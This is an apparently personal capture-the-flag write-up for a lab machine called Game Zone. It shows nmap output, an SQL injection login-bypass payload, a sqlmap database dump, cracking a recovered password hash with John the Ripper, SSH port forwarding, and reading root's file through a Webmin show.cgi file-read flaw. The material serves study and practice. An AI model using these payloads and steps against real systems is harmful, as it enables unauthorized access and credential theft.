# Game Zone
## 1. Recon
`nmap -sT -sC -sV --script vuln <IP_Address> -oN GameZone.nmap -v`

Output of the NMAP:

```# Nmap 7.91 scan initiated Fri Mar 19 03:54:41 2021 as: nmap -sT -sC -sV -oN GameZone.nmap -vv 10.10.215.135
Nmap scan report for 10.10.215.135
Host is up, received syn-ack (0.10s latency).
Scanned at 2021-03-19 03:54:43 UTC for 24s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFJTi0lKi0G+v4eFQU+P+CBodBOruOQC+3C/nXv0JVeR7yDWH6iRsFsevDofWcq05MZBr/CDPCnluhZzM1psx+5bp1Eiv3ecO0PF1QjhAzsPwUcmFSG1zAg+S757M+RFeRs0Jw0WMev8N6aR3uBZQSDPwBHGps+mZZZRcsssckJGQCZ4Qg/6PVFIwNGx9UoftdMFyfNMU/TDZmoatzo/FNEJOhbR38dF/xw9s/HRhugrUsLdNHyBxYShcY3B0Y2eLjnnuUWhYPmLZqgHuHr+eKnb1Ae3MB5lJTfZf3OmWaqcDVI3wpvQK7ACC9S8nxL3vYLyzxlvucEZHM9ILBI7Ov
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKAU0Orx0zOb8C4AtiV+Q1z2yj1DKw5Z2TA2UTS9Ee1AYJcMtM62+f7vGCgoTNN3eFj3lTvktOt+nMYsipuCxdY=
|   256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL6LScmHgHeP2OMerYFiDsNPqgqFbsL+GsyehB76kldy
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 19 03:55:07 2021 -- 1 IP address (1 host up) scanned in 26.34 seconds
```

** There is web server running at port 80. Let have a look at it. **

Oh!! There is a login portal.
It have a SQLI vulnerability.
Lets payload!!!

`' or 1=1 -- -` as username and password.

If there exists the admin user then username:`admin` and password `' or 1=1 -- -`. 

What do the payload meant to be:
1. or ==> Returns True if any one of the statements is True. eg: `A or B` returns true if either A or B becomes true.
2. `1=1` which is True. ==> OR returns True
3. `--` makes the remaining code in the line to comment
4. `-` The previous "--" works only when there is a space following it. To ensure space we are adding "-" to the payload after leaving space. ie: (-- -).

It will redirect to the portal.php page.

## 2. SQLmap

Fire up the burp suite ==> we need to capture the request when we log in to the server.
- [ ] Fire up Burp
- [ ]  Capture the request while log in and save it to the file
- [ ]  `sqlmap -r <File_Name> --dbms=mysql --dump`
- [ ]  After running this command the output will be saved at `/.local/share/sqlmap/output/<Target_Name>`
- [ ]  Find the hashes of the password associated with the username.
- [ ]  Use log file to find the other tables found by the sqlmap.

Username - agent47
Password Hash - ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

## 3. John The Ripper (JTR)

John the Ripper is the password cracking tool.

`john <Hash file in txt> --worldlist=<list> --format=Raw-SHA256`

The password is `videogamer124`.

## 4. Expose services using Reverse SSH tunnels

Connect to the machine using the username and password that we have cracked.

Then type `ss -tulpn`

`ss` is an utility to investigate sockets.

``` t - TCP sockets
	u - UDP
	l - listening sockets
	p - process using the socket
	n - Doesn't resolve service names
```

After running this command we can find 5 tcp sockets were being used.
But we were not able to access the port 10000.

`ssh -L 10000:localhost:10000 username@IP_ADDR` 

After getting the shell go to `localhost:10000` in the local computer to access the web application the firewall is blocking.

Found Webmin Service Running at port 10000.
Service Version 1.580

## 5. Privilege Escalation
We can get the files as root permission from the URL
`http://localhost:10000/file/show.cgi/root/root.txt`







